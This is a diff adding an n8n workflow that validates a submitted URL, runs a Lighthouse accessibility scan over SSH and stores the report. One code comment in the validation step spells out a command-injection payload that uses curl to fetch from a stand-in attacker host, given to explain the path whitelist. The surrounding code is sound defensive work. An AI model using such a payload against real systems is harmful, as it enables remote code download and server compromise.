@@ -1,0 +1,326 @@
+{
+  "name": "BFSG-Schnelltest — Webhook Scan",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "bfsg-scan",
+        "responseMode": "responseNode",
+        "options": {
+          "allowedOrigins": "*"
+        }
+      },
+      "id": "b1c2d3e4-0001-4000-8000-000000000001",
+      "name": "Scan Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "bfsg-scan"
+    },
+    {
+      "parameters": {
+        "jsCode": "// ============================================================\n// Validate & Normalize URL\n// ------------------------------------------------------------\n// Sicherheitskritisch: Diese URL wird gleich in einen SSH-Shell-\n// Befehl eingesetzt (Lighthouse-Scan). Ohne strikte Validierung\n// waere das ein Einfallstor fuer Command Injection UND fuer SSRF\n// gegen interne Adressen des eigenen Servers.\n//\n// Strategie: URL ausschliesslich ueber die eingebaute URL-Klasse\n// parsen und aus den geparsten Bestandteilen NEU zusammensetzen\n// (nicht den rohen User-Input weiterreichen). Hostname UND Pfad\n// werden zusaetzlich auf ein striktes Zeichen-Whitelist geprueft,\n// weil Pfad-Zeichen wie ; $ ( ) & | ' als legale URL-pchar-Zeichen\n// unveraendert im geparsten pathname erhalten bleiben (kein\n// automatisches Shell-Escaping durch die URL-Klasse!). Zusaetzlich\n// wird der finale Wert shell-quotiert als zweite Verteidigungslinie.\n// ============================================================\n\nconst raw = ($json.body && $json.body.url ? String($json.body.url) : '').trim();\n\nfunction fail(reason) {\n  return [{ json: { valid: false, reason } }];\n}\n\nif (!raw) return fail('Keine URL angegeben.');\nif (raw.length > 512) return fail('URL ist zu lang.');\n\n// https:// voranstellen, falls kein Schema angegeben wurde\nconst withScheme = /^https?:\\/\\//i.test(raw) ? raw : `https://${raw}`;\n\nlet parsed;\ntry {\n  parsed = new URL(withScheme);\n} catch (e) {\n  return fail('Das ist keine gueltige URL.');\n}\n\nif (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {\n  return fail('Nur http:// und https:// sind erlaubt.');\n}\n\nconst hostname = parsed.hostname.toLowerCase();\n\n// IPv6-Literale (enthalten ':') pauschal ablehnen -- eigene Prüfung\n// fuer private IPv6-Ranges waere komplex und ist fuer diesen\n// Anwendungsfall (oeffentliche Firmen-/Shop-Websites) nicht noetig.\nif (hostname.includes(':')) {\n  return fail('IPv6-Adressen werden nicht unterstuetzt.');\n}\n\nconst isLocalName =\n  hostname === 'localhost' ||\n  hostname.endsWith('.local') ||\n  hostname.endsWith('.internal') ||\n  hostname.endsWith('.test') ||\n  hostname.endsWith('.localhost');\n\n// Private / reservierte IPv4-Ranges (RFC 1918, Loopback, Link-Local,\n// Carrier-NAT/Shared Address Space inkl. bekannter Cloud-Metadata-\n// Endpunkte wie 100.100.100.200, \"this network\", Multicast/reserviert)\nconst ipv4 = hostname.match(/^(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})\\.(\\d{1,3})$/);\nlet isPrivateIp = false;\nif (ipv4) {\n  const [a, b] = [parseInt(ipv4[1], 10), parseInt(ipv4[2], 10)];\n  isPrivateIp =\n    a === 127 || // Loopback\n    a === 10 || // RFC1918\n    (a === 172 && b >= 16 && b <= 31) || // RFC1918\n    (a === 192 && b === 168) || // RFC1918\n    (a === 169 && b === 254) || // Link-Local\n    (a === 100 && b >= 64 && b <= 127) || // CGNAT/Shared Address Space (u.a. Alibaba-Cloud-Metadata 100.100.100.200)\n    a === 0 || // \"this network\"\n    a >= 224; // Multicast/reserviert\n}\n\nif (isLocalName || isPrivateIp) {\n  return fail('Bitte gib eine oeffentlich erreichbare Website-URL an.');\n}\n\n// Hostname darf nur gaengige Domain-Zeichen enthalten (defense in depth --\n// die URL-Klasse wuerde ungueltige Hostnamen ohnehin schon ablehnen)\nif (!/^[a-z0-9.-]+$/.test(hostname)) {\n  return fail('Der Domainname enthaelt ungueltige Zeichen.');\n}\n\n// KRITISCH: Der Pfad wird von der URL-Klasse NICHT shell-sicher gemacht --\n// Zeichen wie ; $ ( ) & | ' sind legale URL-Pfadzeichen und bleiben\n// woertlich erhalten. Ohne diese Pruefung waere z.B.\n// \"example.com/;curl$IFS-s$IFShttp://angreifer.example/x;\" eine\n// vollstaendige Command-Injection in den nachgelagerten SSH-Befehl.\n// Sehr strenge Whitelist, bewusst enger als \"URL-legal\".\nif (parsed.pathname && !/^[A-Za-z0-9\\-._~/]*$/.test(parsed.pathname)) {\n  return fail('Der Pfad enthaelt nicht unterstuetzte Zeichen.');\n}\n\n// Kanonische URL NEU aus den geprueften Bestandteilen zusammensetzen\n// (kein Query-String, kein Hash -- wir scannen nur die angegebene Seite)\nconst safeUrl = `https://${hostname}${parsed.port ? ':' + parsed.port : ''}${parsed.pathname !== '/' ? parsed.pathname : ''}`;\n\n// Zweite Verteidigungslinie: die URL zusaetzlich POSIX-shell-quotieren,\n// falls die Whitelist oben jemals versehentlich gelockert wird. Nach der\n// Whitelist-Pruefung kann safeUrl kein Single-Quote mehr enthalten --\n// dieser Schritt ist also aktuell ein No-Op, schuetzt aber robust gegen\n// zukuenftige Aenderungen an der Validierung.\nconst shellQuoted = \"'\" + safeUrl.replace(/'/g, \"'\\\\''\") + \"'\";\n\n// Nicht-kryptografische UUID v4 als oeffentliche Report-ID -- ausreichend\n// fuer eine schwer erratbare, aber nicht sicherheitskritische Kennung.\nfunction uuidv4() {\n  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {\n    const r = (Math.random() * 16) | 0;\n    const v = c === 'x' ? r : (r & 0x3) | 0x8;\n    return v.toString(16);\n  });\n}\n\nreturn [{\n  json: {\n    valid: true,\n    url: safeUrl,\n    urlShellQuoted: shellQuoted,\n    reportId: uuidv4(),\n    requestedAt: new Date().toISOString(),\n  },\n}];\n"
+      },
+      "id": "b1c2d3e4-0002-4000-8000-000000000002",
+      "name": "Validate & Normalize URL",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        220,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "options": {
+            "caseSensitive": true,
+            "leftValue": "",
+            "typeValidation": "strict",
+            "version": 1
+          },
+          "conditions": [
+            {
+              "id": "url-valid",
+              "leftValue": "={{ $json.valid }}",
+              "rightValue": true,
+              "operator": {
+                "type": "boolean",
+                "operation": "true",
+                "singleValue": true
+              }
+            }
+          ],
+          "combinator": "and"
+        },
+        "options": {}
+      },
+      "id": "b1c2d3e4-0003-4000-8000-000000000003",
+      "name": "URL gueltig?",
+      "type": "n8n-nodes-base.if",
+      "typeVersion": 2.2,
+      "position": [
+        440,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseCode": 400,
+        "responseBody": "={{ { success: false, error: $json.reason } }}",
+        "options": {}
+      },
+      "id": "b1c2d3e4-0004-4000-8000-000000000004",
+      "name": "Fehlerantwort (ungueltige URL)",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [
+        660,
+        160
+      ]
+    },
+    {
+      "parameters": {
+        "authentication": "privateKey",
+        "command": "={{ 'lighthouse ' + $json.urlShellQuoted + ' --only-categories=accessibility --output=json --chrome-flags=\"--headless --no-sandbox --disable-dev-shm-usage\" --quiet --max-wait-for-load=45000 2>/dev/null' }}"
+      },
+      "id": "b1c2d3e4-0005-4000-8000-000000000005",
+      "name": "Lighthouse Scan",
+      "type": "n8n-nodes-base.ssh",
+      "typeVersion": 1,
+      "position": [
+        660,
+        -80
+      ],
+      "credentials": {
+        "sshPrivateKey": {
+          "id": "DAjiQBL7pUMlOqHe",
+          "name": "SSH Private Key account"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "jsCode": "// ============================================================\n// Parse Lighthouse Results\n// ============================================================\n\nconst meta = $('Validate & Normalize URL').first().json;\n\n// Obergrenzen gegen sehr grosse Reports (Self-DoS-Schutz: der Report\n// wird spaeter base64-kodiert per SSH-Kommandozeile geschrieben, die\n// Kommandozeilenlaenge ist begrenzt/ARG_MAX-limitiert)\nconst MAX_FAILED = 50;\nconst MAX_TITLES = 100;\n\nlet score = null;\nlet lhFailed = [];\nlet lhPassed = [];\nlet lhManual = [];\nlet parseError = null;\n\ntry {\n  const stdout = $json.stdout || '';\n  const lh = JSON.parse(stdout);\n  score = Math.round(lh.categories.accessibility.score * 100);\n\n  for (const [key, audit] of Object.entries(lh.audits)) {\n    if (audit.scoreDisplayMode === 'manual') {\n      lhManual.push(audit.title);\n    } else if (audit.score === 0) {\n      lhFailed.push({\n        id: key,\n        title: audit.title,\n        description: (audit.description || '').replace(/\\[.*?\\]\\(.*?\\)/g, '').trim(),\n      });\n    } else if (audit.score === 1) {\n      lhPassed.push(audit.title);\n    }\n  }\n\n  lhFailed = lhFailed.slice(0, MAX_FAILED);\n  lhPassed = lhPassed.slice(0, MAX_TITLES);\n  lhManual = lhManual.slice(0, MAX_TITLES);\n} catch (e) {\n  parseError = 'Der Scan konnte nicht ausgewertet werden. Bitte versuche es erneut.';\n}\n\nreturn [{\n  json: {\n    reportId: meta.reportId,\n    url: meta.url,\n    requestedAt: meta.requestedAt,\n    completedAt: new Date().toISOString(),\n    score,\n    parseError,\n    failedCount: lhFailed.length,\n    passedCount: lhPassed.length,\n    manualCount: lhManual.length,\n    lhFailed,\n    lhPassed,\n    lhManual,\n  },\n}];\n"
+      },
+      "id": "b1c2d3e4-0006-4000-8000-000000000006",
+      "name": "Parse Lighthouse Results",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        900,
+        -80
+      ]
+    },
+    {
+      "parameters": {
+        "jsCode": "// ============================================================\n// Build Report File (fuer spaetere Report-Seite)\n// ============================================================\n// Base64-kodiert, damit der Inhalt gefahrlos ueber die SSH-Kommandozeile\n// geschrieben werden kann (kein Escaping von Anfuehrungszeichen/\n// Zeilenumbruechen im JSON noetig).\n\nconst report = $json;\nconst json = JSON.stringify(report, null, 2);\nconst base64 = Buffer.from(json, 'utf-8').toString('base64');\n\nreturn [{\n  json: {\n    ...report,\n    reportBase64: base64,\n  },\n}];\n"
+      },
+      "id": "b1c2d3e4-0007-4000-8000-000000000007",
+      "name": "Build Report File",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [
+        1380,
+        -80
+      ]
+    },
+    {
+      "parameters": {
+        "authentication": "privateKey",
+        "command": "={{ 'mkdir -p /var/www/reports && echo ' + $json.reportBase64 + ' | base64 -d > /var/www/reports/' + $json.reportId + '.json' }}"
+      },
+      "id": "b1c2d3e4-0008-4000-8000-000000000008",
+      "name": "Report auf Server speichern",
+      "type": "n8n-nodes-base.ssh",
+      "typeVersion": 1,
+      "position": [
+        1620,
+        -80
+      ],
+      "credentials": {
+        "sshPrivateKey": {
+          "id": "DAjiQBL7pUMlOqHe",
+          "name": "SSH Private Key account"
+        }
+      }
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ { success: true, reportId: $('Build Report File').first().json.reportId, url: $('Build Report File').first().json.url, score: $('Build Report File').first().json.score, failedCount: $('Build Report File').first().json.failedCount, passedCount: $('Build Report File').first().json.passedCount, manualCount: $('Build Report File').first().json.manualCount, failedItems: $('Build Report File').first().json.lhFailed.slice(0, 6) } }}",
+        "options": {}
+      },
+      "id": "b1c2d3e4-0009-4000-8000-000000000009",
+      "name": "Erfolgsantwort an Website",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [
+        1860,
+        -80
+      ]
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "options": {
+            "caseSensitive": true,
+            "leftValue": "",
+            "typeValidation": "strict",
+            "version": 1
+          },
+          "conditions": [
+            {
+              "id": "parse-ok",
+              "leftValue": "={{ $json.parseError }}",
+              "rightValue": "",
+              "operator": {
+                "type": "string",
+                "operation": "empty",
+                "singleValue": true
+              }
+            }
+          ],
+          "combinator": "and"
+        },
+        "options": {}
+      },
+      "id": "b1c2d3e4-0010-4000-8000-000000000010",
+      "name": "Scan erfolgreich?",
+      "type": "n8n-nodes-base.if",
+      "typeVersion": 2.2,
+      "position": [
+        1140,
+        -240
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseCode": 502,
+        "responseBody": "={{ { success: false, error: $json.parseError, reportId: $json.reportId, url: $json.url } }}",
+        "options": {}
+      },
+      "id": "b1c2d3e4-0011-4000-8000-000000000011",
+      "name": "Fehlerantwort (Scan fehlgeschlagen)",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1.1,
+      "position": [
+        1380,
+        -300
+      ]
+    }
+  ],
+  "connections": {
+    "Scan Webhook": {
+      "main": [
+        [
+          {
+            "node": "Validate & Normalize URL",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Validate & Normalize URL": {
+      "main": [
+        [
+          {
+            "node": "URL gueltig?",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "URL gueltig?": {
+      "main": [
+        [
+          {
+            "node": "Lighthouse Scan",
+            "type": "main",
+            "index": 0
+          }
+        ],
+        [
+          {
+            "node": "Fehlerantwort (ungueltige URL)",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Lighthouse Scan": {
+      "main": [
+        [
+          {
+            "node": "Parse Lighthouse Results",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Parse Lighthouse Results": {
+      "main": [
+        [
+          {
+            "node": "Scan erfolgreich?",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Build Report File": {
+      "main": [
+        [
+          {
+            "node": "Report auf Server speichern",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Report auf Server speichern": {
+      "main": [
+        [
+          {
+            "node": "Erfolgsantwort an Website",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Scan erfolgreich?": {
+      "main": [
+        [
+          {
+            "node": "Build Report File",
+            "type": "main",
+            "index": 0
+          }
+        ],
+        [
+          {
+            "node": "Fehlerantwort (Scan fehlgeschlagen)",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "settings": {
+    "executionOrder": "v1"
+  },
+  "pinData": {}
+}
